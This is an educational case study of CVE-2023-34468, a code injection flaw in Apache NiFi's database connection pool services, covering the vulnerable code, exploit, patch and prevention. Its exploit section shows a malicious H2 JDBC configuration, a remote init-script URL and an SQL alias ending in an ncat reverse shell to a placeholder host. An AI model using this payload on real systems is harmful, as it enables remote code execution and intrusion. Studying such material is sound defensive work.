# CODE INJECTION IN APACHE NIFI

## Introduction

This case study is about a code injection weakness disclosed on June 12, 2023 that affected multiple database connector components in the Apache NiFi dataflow platform. In data engineering, flexible and modular software components are essential for maintaining a production data pipeline. However, this flexibility also introduces added complexity when implementing proper security controls. Core components often need to interface with a variety of other open source systems, such as databases, message queues, or web APIs. While dynamic user configuration offers the most flexible and reusable solution, it frequently risks the uncontrolled generation of malicious code. This underlying weakness is annually one of the CWE™ Top 25 Most Dangerous Software Weaknesses, ranking #11 in 2024 and #10 in 2025.  This case study will look at the mistake made by the developers, the resulting vulnerability, what it enabled an adversary to accomplish, and how the code was eventually corrected.

## Software

**Name:** Apache NiFi  
**Language:** Java  
**URL:** <https://github.com/apache/nifi>  

## Weakness

[CWE-94: Improper Control of Generation of Code](https://cwe.mitre.org/data/definitions/94.html)

This type of weakness occurs when untrusted user-controlled input is leveraged to construct all or part of a code segment. If this input is not properly neutralized (e.g., canonicalized, encoded, escaped, quoted, validated), then the underlying application may be vulnerable to code injection.

The following generic example illustrates how a user-controlled configuration influences which database driver the application initializes and runs. It shows both the intended behavior, where a benign database is selected, and the misconfiguration scenario, where an unintended backend exposes additional capabilities that can lead to code injection.

```
public class GenericDbBootstrap
{
    public static void main(String[] args) throws Exception
    {
        // User-controlled configuration (env/file/UI/etc.)
        String driverClass = System.getProperty("db.driverClass");
        String jdbcUrl = System.getProperty("db.url");

        // Application uses config to select the backend
        Class.forName(driverClass);
        Connection conn = DriverManager.getConnection(jdbcUrl);

        // Intended behavior: driverClass=org.postgresql.Driver, jdbcUrl=jdbc:postgresql://...
        // Misconfiguration: driverClass=org.h2.Driver, jdbcUrl=jdbc:h2:mem:test;...

        System.out.println("Connected using: " + driverClass + " -> " + jdbcUrl);
        conn.close();
    }
}
```

In the example above, the misconfiguration is the provision of an unintended JDBC driver which may have features that are unexpected and not protected against. The lack of validation associated with the getProperty() calls allows an adversary to provide any drivedClass and url that they desire.

## Vulnerability

[CVE-2023-34468](https://www.cve.org/CVERecord?id=CVE-2023-34468) - Published 12 June 2023

Apache NiFi is an open-source dataflow automation platform built around a flexible processor and controller-service framework. That extensibility enables many integrations (databases, message queues, APIs), but it also increases the number of configuration and code paths exposed to administrators and operators. In 2023, a critical issue was identified in NiFi’s database connection pooling controller services. The issue affected both `DBCPConnectionPool` and `HikariCPConnectionPool`. This case study focuses on the `DBCPConnectionPool` service, but both are impacted in similar ways.

On line 40 in DBCPConnectionPool.java, the retrieved `DATABASE_URL` property descriptor in the DBCPProperties class was only validated with `StandardValidators.NON_EMPTY_VALIDATOR`, meaning any non-empty JDBC URL was accepted. This allowed an attacker to provide a controlled, fully arbitrary JDBC connection string. When used with the H2 JDBC driver bundled with the default NiFi distribution, a maliciously crafted H2 JDBC URL could subsequently be provided to leverage H2 initialization/URL features to execute arbitrary Java code, resulting in remote code execution.

```diff
vulnerable file: nifi-nar-bundles/nifi-extension-utils/nifi-dbcp-base/src/main/java/org/apache/nifi/dbcp/utils/DBCPProperties.java

 30 public final class DBCPProperties {
 31
 32    private DBCPProperties() {
 33    }
 34
 35    public static final PropertyDescriptor DATABASE_URL = new PropertyDescriptor.Builder()
 36            .name("Database Connection URL")
 37            .description("A database connection URL used to connect to a database. May contain database system name, host, port, database name and some parameters."
 38                    + " The exact syntax of a database connection URL is specified by your DBMS.")
 39            .defaultValue(null)
-40            .addValidator(StandardValidators.NON_EMPTY_VALIDATOR)
 41            .required(true)
 42            .expressionLanguageSupported(ExpressionLanguageScope.VARIABLE_REGISTRY)
 43            .build();
```

An attacker-controlled JDBC URL could be loaded through NiFi's internal `ConfigurationContext` in a function named `getDataSourceConfiguration` on line 83 in `AbstractDBCPConnectionPool`. The getDataSourceConfiguration() function is implemented in `DBCPConnectionPool` on lines 212–213, where the service reads and evaluates user-controlled `DATABASE_URL` and `DB_DRIVERNAME` values to build the `DataSourceConfiguration` which provides an interface for database connection pooling.

```diff
supporting file:  nifi-nar-bundles/nifi-extension-utils/nifi-dbcp-base/src/main/java/org/apache/nifi/dbcp/AbstractDBCPConnectionPool.java

 81       final BasicDataSource dataSource = new BasicDataSource();
 82       try {
-83           final DataSourceConfiguration configuration = getDataSourceConfiguration(context);
 84           configureDataSource(context, configuration);
```

```diff
supporting file: nifi-nar-bundles/nifi-standard-services/nifi-dbcp-service-bundle/nifi-dbcp-service/src/main/java/org/apache/nifi/dbcp/DBCPConnectionPool.java

 210    @Override
 211   protected DataSourceConfiguration getDataSourceConfiguration(ConfigurationContext context) {
-212       final String url = context.getProperty(DATABASE_URL).evaluateAttributeExpressions().getValue();
-213       final String driverName = context.getProperty(DB_DRIVERNAME).evaluateAttributeExpressions().getValue();
 ...
```

That configuration is then applied to the underlying BasicDataSource, which instantiates the specified driver and opens connections using the supplied JDBC URL. NiFi then interfaces with a SQL driver provided by the user regardless of what driver the user has selected. This exposes the underlying vulnerability, due to the H2 database JAR being put on the runtime class-path of the NiFi application.

## Exploit

[CAPEC-242: Code Injection]( https://capec.mitre.org/data/definitions/242.html)

To exploit this vulnerability, an adversary can configure a `DBCPConnectionPool` with the following properties:

|Property|Value|
|--------|-----|
|Database Connection URL | `jdbc:h2:mem:tempdb;TRACE_LEVEL_SYSTEM_OUT=3` |
|Database Driver Class Name | `org.h2.Driver` |
|Database Driver Location | `work/nar/extensions/nifi-poi-nar-1.21.0.nar-unpacked/NAR-INF/bundled-dependencies/h2-2.1.214.jar` |

NOTE: The `Database Connection URL` can be given an initialization script to automatically create and execute the malicious java code (`INIT=RUNSCRIPT FROM "http://{REMOTE-HOST}"`)

Now any processor configured to use the `DBCPConnectionPool` will utilize the underlying embedded H2 database driver when connections are requested. Malicious UDFs can be created and executed on the adversary's command. The following is an example exploitation via a reverse shell:

```sql
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.Exception {
    String[] cmd = {"bash", "-c", cmd};
    java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
    return s.hasNext() ? s.next() : ""; }
$$;
CALL SHELLEXEC('ncat -e /bin/bash {REMOTE-IP} {REMOTE-PORT}')
```

## Fix

To resolve this issue, the source code was modified to include input validation on the `DATABASE_URL` property to prevent the use of the H2 database. The input validation was implemented via the ConnectionUrlValidator class on lines 23 and 41 which implements NiFi's `Validator` interface.

```diff
fixed file: nifi-nar-bundles/nifi-extension-utils/nifi-dbcp-base/src/main/java/org/apache/nifi/dbcp/utils/DBCPProperties.java

 23 import org.apache.nifi.dbcp.ConnectionUrlValidator;
 ...
 31 public final class DBCPProperties {
 32
 33    private DBCPProperties() {
 34    }
 35
 36    public static final PropertyDescriptor DATABASE_URL = new PropertyDescriptor.Builder()
 37            .name("Database Connection URL")
 38            .description("A database connection URL used to connect to a database. May contain database system name, host, port, database name and some parameters."
 39                    + " The exact syntax of a database connection URL is specified by your DBMS.")
 40            .defaultValue(null)
-41            .addValidator(StandardValidators.NON_EMPTY_VALIDATOR)
+41            .addValidator(new ConnectionUrlValidator())
 42            .required(true)
 43            .expressionLanguageSupported(ExpressionLanguageScope.VARIABLE_REGISTRY)
 44            .build();
```

The added ConnectionURLValidator class takes a flexible approach of defining a series of unsupported schemes, and ensuring they are used within the raw input. The string literal `jbdc:h2` is explicitly defined as an unsupported scheme and therefore disallowing its use within the underlying configuration.

```diff
fixed file: nifi-nar-bundles/nifi-standard-services/nifi-dbcp-service-api/src/main/java/org/apache/nifi/dbcp/ConnectionUrlValidator.java

 29    public class ConnectionUrlValidator implements Validator {
 30        private static final Set<String> UNSUPPORTED_SCHEMES = Collections.singleton("jdbc:h2");
 ...
 54        private boolean isUrlUnsupported(final String url) {
 55            boolean unsupported = false;
 56
 57            for (final String unsupportedScheme : UNSUPPORTED_SCHEMES) {
 58                if (url.startsWith(unsupportedScheme)) {
 59                    unsupported = true;
 60                    break;
 61                }
 62            }
 63
 64            return unsupported;
 65        }
 66    }
```

## Prevention

The approach to fixing this vulnerability is to blacklist certain input criteria from being used as configuration. While this approach did prevent the underlying vulnerability as described in [CVE-2023-34468](https://www.cve.org/CVERecord?id=CVE-2023-34468), it only prevents one particular bad input.

To mitigate the risk associated with this vulnerability, developers must ensure that input validation is applied to all untrusted inputs. Ideally, this validation should be based on an allow-list (whitelist) that explicitly defines which inputs are acceptable for each configuration field.

In this case study, the Apache NiFi developers used a deny-list to block the H2 embedded database. While this approach was sufficient to address the remote code execution vulnerability in the short-term, it is less secure than redesigning the configuration around an allow-list. A deny-list only works when all dangerous cases are known at implementation time. Instead of allowing arbitrary drivers, the flexible driver design could be replaced with an enumerated set of supported driver platforms. Such a design would prevent the unintended use of the H2 database.

After the patch in version 1.22.0, another validation-related vulnerability [CVE-2023-40037](https://www.cve.org/CVERecord?id=CVE-2023-40037) was discovered in the same connector services. Addressing this issue required additional checks in the `ConnectionURLValidator` to prevent further unintended consequences. This situation aligns with [CWE-184](https://cwe.mitre.org/data/definitions/184.html) and provides further evidence that a more fundamental redesign based on strong allow-listing may be necessary.

## Conclusion

This case study illustrates the pros and cons of flexible application design, and how unchecked extensibility can lead to unintended consequences. It also exemplifies the importance of assumptions made by open-source technologies, and when they align with use in a production environment. Untrusted input comes in a wide variety of different formats and mediums, and it is paramount that developers protect systems at the front door so that applications behave as expected and do not allow uncontrolled access to anything beyond the developer's intention.

## References

Project Repository: <https://github.com/apache/nifi>

CVE-2023-34468 Entry: <https://www.cve.org/CVERecord?id=CVE-2023-34468>

CWE-94 Entry: <https://cwe.mitre.org/data/definitions/94.html>

NVD Vulnerability Report: <https://nvd.nist.gov/vuln/detail/cve-2023-34468>

Apache NiFi Security Reporting: <https://nifi.apache.org/documentation/security/>

Apache NiFi v1.22.0 Release Notes: <https://issues.apache.org/jira/secure/ReleaseNote.jspa?projectId=12316020&version=12353069>

JIRA Issue: <https://issues.apache.org/jira/browse/NIFI-11653>

Patch Pull Request: <https://github.com/apache/nifi/pull/7349/commits/6e064a8bdef1cd4f91ea8f42ee16a3675d2f9a9d>

Exploitation Guide: <https://github.com/mbadanoiu/CVE-2023-34468/blob/main/Apache%20NiFi%20-%20CVE-2023-34468.pdf>

## Contributions

Originally created by Alexander Castro - George Mason University  
Reviewed by Phil Hilliard – The MITRE Corporation  
Reviewed by Drew Buttner - The MITRE Corporation

(C) 2026 The MITRE Corporation. All rights reserved.  
This work is openly licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC-BY-4.0</a>
